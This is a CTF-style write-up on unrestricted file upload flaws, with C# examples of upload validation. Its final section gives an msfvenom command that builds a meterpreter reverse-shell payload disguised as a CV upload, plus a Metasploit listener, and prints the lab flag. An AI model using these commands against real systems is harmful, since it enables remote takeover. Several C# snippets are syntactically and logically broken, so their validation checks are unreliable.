---
title: Day 15 - Secure Coding (Securing File Upload)
desc: >-
  Day 15 covers topics related to input validation of file upload functionality,
  unrestricted file upload vulnerabilities and how to properly secure file
  upload functionality.
---
## Unrestricted File Uploads

Poor handling of file uploads can lead to serious vulnerabilities ranging from minor annoyances to full Remote Code Execution (RCE) if an attacker manages to upload and execute a shell. 

Unrestricted file uploads usually have two main exploitation paths:

- Code execution if the uploaded file can be retrieved/accessed.
- Uploaded files viewed by another user can be a vector for a phishing attack via embeded malware in the uploaded file to execute code.

## Web Root

When a resource is requested with a specific file type (eg. ASP, ASPX, CSHTML, PHP), the webserver will first execute the instructions found in the resource before sending the compiled response back to the user.

With unrestricted file upload allowed, an attacker could upload one of these special types of files with malicious code. If this file is stored in the `web root`, the attacker could request the file from the server, thus forcing the server to execute the code within the file before sending the response leading to `Remote Code Execution` on the server.

If the malicious file is stored outisde the `web root`, an attacker cannot make a request that would retrieve the uploaded file. However, this protection is not sufficient for two main reasons:

- Vulnerabilities such as `Local File Inclusion (LFI)` may exist that allow an attacker to force the webserver itself to recover the file that was stored outside the web root. If the file is recoverable, the code within the file can be executed allowing for RCE.
- In cases were RCE may not be possible, knowing that a human will be interacting with the uploaded file opens up phishing vectors to allow malicious code to execution.

## Properly Securing File Uploads

To adequately secure a file upload feature, layers of defence need to be implemented. Let's use the following C# file upload as a case study.

```csharp
public IActionResult OnPostUpload(FileUpload fileUpload)
  {
    var fullPath = "D:\CVUploads\"
    var formFile = fileUpload.FormFile;
    var filePath = Path.Combine(fullPath, formFile.FileName);

    Using (var stream = System.IO.File.Create(filePath))
    {
      formFile.CopyToAsync(stream);
    }
  }
```

### File Content Validation

The content of a file can be validated by reviewing the `ContentType` header in the server response when the file is uploaded. If the file content type is not what is expected, the file should be rejected. It should be noted that the `ContentType` header can be manipulated by intercepting the requested using `Burp Suite`.

The example below validates the `ContentType` header and rejects the file if it does not match `PDF`.

```csharp
string contentType = fileUpload.ContentType.Split('/')[1].ToLower();
if !(contentType.equals("ContentType=PDF")
    {
        allowed = False;
    }
```

### File Extension Validation

Validating file extensions for uploaded files is another good way of adding another layer of defence. Ideally, file extension validation should be implemented with an `allowlist` rather than a `rejectlist` (ie. default reject-all except what is on the allowlist) since a blocklist can still be bypassed in certain cases.

In the following example, the extension of the uploaded file is compared to the allowed list (PDF). If the extension does not match, the file is rejected.

```csharp
string contentExtension = Path.GetExtension(fileUpload);
if !(contentExtension.equals("PDF"))
    {
        allowed = False;
    }
```

### File Size Validation

File size validation is a good practice to ensure that a threat actor does not upload a large size file thereby filling up the space allocated on the webserver. This can result in a psuedo `Denial of Service` attack on other users who might wish to upload files.

The following example, limits uploaded file size to 10Mb.

```csharp
int contentSize = fileUpload.ContentLength;
//10Mb max file size
int maxFileSize = 10 * 1024 * 1024
if (contentSize > maxFileSize)
    {
        allowed = False;
    }
```

### File Renaming

Eventhough the uploaded files are stored outside the `web root`, an attacker could leverage `LFI` vulnerabilities to execute malicious code contained in the file. A good counter to this is to randomize the name of the uploaded file to prevent the attacker from recovering their file by name (IDOR and LFI).

```csharp
Guid id = Guid.NewGuid();
var filePath = Path.Combine(fullPath, id + ".pdf");
```

### Malware Scanning

The addition of above mentioned controls still contains the risk of an attacker uploading a malicious file with the aim of exploiting the phishing attack vector. A good practice is to scan the uploaded file for any malicious code using a malware scanner such as `ClamAV`.

```csharp
var clam = new ClamClient(this._configuration["ClamAVServer:URL"],Convert.ToInt32(this._configuration["ClamAVServer:Port"])); 
var scanResult = await clam.SendAndScanFileAsync(fileBytes);  

if (scanResult.Result == ClamScanResults.VirusDetected)
    {
        allowed = False;
    }; 
```

### Putting it all Together

Implementing all of the above techniques gives us a much more secure file upload utility.

```csharp
public IActionResult OnPostUpload(FileUpload fileUpload)
    {
        var allowed = True;

        //Store file outside the web root   
        var fullPath = "D:\CVUploads\"

        var formFile = fileUpload.FormFile;

        //Create a GUID for the file name
        Guid id = Guid.NewGuid();
        var filePath = Path.Combine(fullPath, id + ".pdf");

        //Validate the content type
        string contentType = fileUpload.ContentType.Split('/')[1].ToLower();
        if !(contentType.equals("ContentType=PDF")
            {
                allowed = False;
            }

       //Validate the content extension
       string contentExtension = Path.GetExtension(fileUpload);
       if !(contentExtension.equals("PDF"))
           {
               allowed = False;
           }

       //Validate the content size
       int contentSize = fileUpload.ContentLength;
       //10Mb max file size
       int maxFileSize = 10 * 1024 * 1024
       if (contentSize > maxFileSize)
           {
               allowed = False;
           }

       //Scan the content for malware
       var clam = new ClamClient(this._configuration["ClamAVServer:URL"],Convert.ToInt32(this._configuration["ClamAVServer:Port"])); 
       var scanResult = await clam.SendAndScanFileAsync(fileBytes);  

       if (scanResult.Result == ClamScanResults.VirusDetected)
           {
                allowed = False;
           };

       //Only upload if all checks are passed
       if (allowed)
       {
            using (var stream = System.IO.File.Create(filePath))
                {
                    formFile.CopyToAsync(stream);
                }
       }
    }
```

## CTF Questions

Experimenting with the file upload web-app, we find that the utility does not enforce any kind of file-type filtering. The application allows unrestricted file upload; however, the uploaded file is not directly accessible by us. We do know however that a person will physically be interacting with the file we upload which opens up the an exploit vector.

Let's craft a malicious payload which we can upload using `msfvenom`.

```text
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=9999 -f exe -o cv.exe
```

Before uploading the file, let's fire up `Metasploit` and get our listener ready.

```text
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 9999; exploit"
```

Upload the file and wait for the callback. Drop into a `Meterpreter shell` using the command `shell`.

Navigate to `C:\Users\HR_Elf\Documents` and use `type flag.txt` to read-out the flag: `THM{Naughty.File.Uploads.Can.Get.You.RCE}`